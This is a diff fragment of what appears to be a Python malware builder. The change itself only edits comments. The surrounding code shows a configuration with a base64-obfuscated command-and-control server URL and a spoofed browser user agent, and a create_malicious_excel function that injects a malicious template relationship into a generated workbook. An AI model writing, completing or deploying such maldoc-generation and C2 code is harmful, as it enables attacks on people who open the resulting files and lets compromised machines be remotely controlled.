@@ -20,7 +20,7 @@ from Crypto.Util.Padding import pad
 import argparse
 import requests
 
-# Configuration - Obfuscated with simple encoding
+# Configuration
 CONFIG = {
     'c2_server': base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21tYW5k').decode('utf-8'),
     'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -223,7 +223,7 @@ def create_malicious_excel(output_file):
         with open(os.path.join(tmpdir, 'xl/workbook.xml'), 'w') as f:
             f.write(workbook_content)
         
-        # Create relationships that include our malicious template
+        # Create relationships that include malicious template
         workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
     <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
